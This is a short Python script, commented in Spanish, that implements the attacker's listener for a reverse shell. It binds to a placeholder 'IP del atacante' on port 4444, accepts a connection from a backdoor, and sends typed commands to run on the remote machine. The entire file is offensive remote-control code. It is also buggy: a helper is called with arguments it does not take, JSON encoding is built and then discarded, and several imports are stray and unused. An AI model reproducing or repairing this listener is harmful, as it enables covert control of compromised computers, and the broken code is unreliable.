from audioop import add

from distutils.cmd import Command

import socket

from sqlite3 import connect

import json

#Ahora vamos a convertir este codigo en una clase

 

class Listener:

    def __init__(self, ip, port):

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip, port))

        listener.listen(0)

        print("[+]Esperando a las conexiones")

        self.connection, address = listener.accept()

        print("[+]Tenemos una conexion de " + str(address))

 

#Estas dos funciones siguientes son para convertir los mensaje a JSON y que no pierdan su integridad

 

#Esta es la de envio de paquetes

 

    def envio_seguro(self, data):

        json_data = json.dumps(data)

        self.connection.sendto(data.encode(),("IP del atacante", 4444))

        #self.connection.send(json_data)




#Y esta es la del recibimiento de paquetes

 

    def recibimiento_seguro(self):

        json_data = ""

        while True:

            try:

                json_data = self.connection.recv(1024)

                return json.loads(json_data)

            except ValueError:

                    continue

 

    def ejecutar_remotamente(self, command):

       

        self.envio_seguro(command)

        return self.recibimiento_seguro(command.encode(),("IP del atacante", 4444))

        #self.connection.sendto(command.encode(),("IP del atacante", 4444))

        #return self.connection.recv(1024)

 

    def run(self):

        while True:

            command = input(">> ")

            #connection.send(command)

            result = self.ejecutar_remotamente(command)

            print(result)





escuchar = Listener("IP del atacante", 4444)

escuchar.run()